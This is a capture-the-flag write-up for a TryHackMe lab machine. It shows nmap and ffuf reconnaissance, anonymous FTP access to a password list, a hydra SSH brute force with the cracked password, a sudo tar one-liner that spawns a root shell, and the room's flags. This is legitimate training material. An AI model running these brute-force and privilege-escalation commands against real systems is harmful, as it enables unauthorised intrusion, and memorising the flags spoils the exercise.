# Target:10.10.165.84
First lets run a nmap scan to find the open ports 
```
nmap 10.10.165.84            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 09:31 IST  
Nmap scan report for 10.10.165.84  
Host is up (0.26s latency).  
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)  
PORT   STATE SERVICE  
21/tcp open  ftp  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds
```
Now lets go visit website
![image](Pasted%20image%2020250916095151.png)
no clue lets do a dirctory attack on website 
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://10.  
10.165.84/FUZZ  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://10.10.165.84/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.  
txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________  
  
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 432ms]  
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 301ms]  
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 250ms]
```
in the time ffuf is running lets visit the ftp 
```
ftp 10.10.165.84                              
Connected to 10.10.165.84.  
220 (vsFTPd 3.0.5)  
Name (10.10.165.84:nobu):    
530 This FTP server is anonymous only.  
ftp: Login failed  
ftp>    
ftp> exit  
221 Goodbye.
```
so anonymous login only lets do that
```
ftp 10.10.165.84  
Connected to 10.10.165.84.  
220 (vsFTPd 3.0.5)  
Name (10.10.165.84:nobu): anonymous  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
550 Permission denied.  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt  
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt  
226 Directory send OK.  
ftp> get task.txt  
local: task.txt remote: task.txt  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for task.txt (68 bytes).  
100% |*********************************************************|    68      754.61 KiB/s    00:00 ETA  
226 Transfer complete.  
68 bytes received in 00:00 (0.21 KiB/s)  
ftp> get locks.txt  
local: locks.txt remote: locks.txt  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for locks.txt (418 bytes).  
100% |*********************************************************|   418       23.44 MiB/s    00:00 ETA  
226 Transfer complete.  
418 bytes received in 00:00 (1.71 KiB/s)  
ftp>
```
now we have the task to answer the question on tryhackme 
```
cat task.txt       
1.) Protect Vicious.  
2.) Plan for Red Eye pickup on the moon.  
  
-lin
```
we also had another file 
```
cat locks.txt    
rEddrAGON  
ReDdr4g0nSynd!cat3  
Dr@gOn$yn9icat3  
R3DDr46ONSYndIC@Te  
ReddRA60N  
R3dDrag0nSynd1c4te  
dRa6oN5YNDiCATE  
ReDDR4g0n5ynDIc4te  
R3Dr4gOn2044  
RedDr4gonSynd1cat3  
R3dDRaG0Nsynd1c@T3  
Synd1c4teDr@g0n  
reddRAg0N  
REddRaG0N5yNdIc47e  
Dra6oN$yndIC@t3  
4L1mi6H71StHeB357  
rEDdragOn$ynd1c473  
DrAgoN5ynD1cATE  
ReDdrag0n$ynd1cate  
Dr@gOn$yND1C4Te  
RedDr@gonSyn9ic47e  
REd$yNdIc47e  
dr@goN5YNd1c@73  
rEDdrAGOnSyNDiCat3  
r3ddr@g0N  
ReDSynd1ca7e
```
seems like a password list also we had a username in the task.txt 
lets bruteforce ssh with hydra 
```
hydra -l lin  -P locks.txt 10.10.165.84 ssh    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret servi  
ce organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anywa  
y).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 09:45:06  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the  
tasks: use -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previou  
s session found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task  
[DATA] attacking ssh://10.10.165.84:22/  
[22][ssh] host: 10.10.165.84   login: lin   password: RedDr4gonSynd1cat3  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 1 final worker threads did not complete until end.  
[ERROR] 1 target did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 09:45:26
```
now that we have password lets login with ssh
```
ssh lin@10.10.165.84              
The authenticity of host '10.10.165.84 (10.10.165.84)' can't be established.  
ED25519 key fingerprint is SHA256:aRXNZbLTGvgOw9ZG78xRshRmIZIWtVj7APfFQ3oaxBc.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.10.165.84' (ED25519) to the list of known hosts.  
lin@10.10.165.84's password:    
Permission denied, please try again.  
lin@10.10.165.84's password:    
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
Enable ESM Infra to receive additional future security updates.  
See https://ubuntu.com/esm or run: sudo pro status  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or  
proxy settings  
  
Your Hardware Enablement Stack (HWE) is supported until April 2025.  
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228  
  
lin@ip-10-10-165-84:~/Desktop$    
lin@ip-10-10-165-84:~/Desktop$ ls  
user.txt  
lin@ip-10-10-165-84:~/Desktop$ cat user.txt  
THM{CR1M3_SyNd1C4T3}

```
now we have low privlage but to get root.txt we need root access 
so lets check for privilage escalation vectors
```
sudo -l  
[sudo] password for lin:    
Sorry, try again.  
[sudo] password for lin:    
Matching Defaults entries for lin on ip-10-10-165-84:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User lin may run the following commands on ip-10-10-165-84:  
   (root) /bin/tar
```
fortunately the first vector i checked itself is leading to root access lets visit gtfobins to get the command to spawn root shell 
![image](Pasted%20image%2020250916100257.png)

now that we have it lets execute it 
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exe  
c=/bin/sh  
tar: Removing leading `/' from member names  
# ls  
user.txt  
# find / -type f -name "root.txt" 2>/dev/null  
/root/root.txt  
  
^C  
# cat /root/root.txt           
THM{80UN7Y_h4cK3r}
```
after executing we have got root access and then we used it to get the root.txt flag
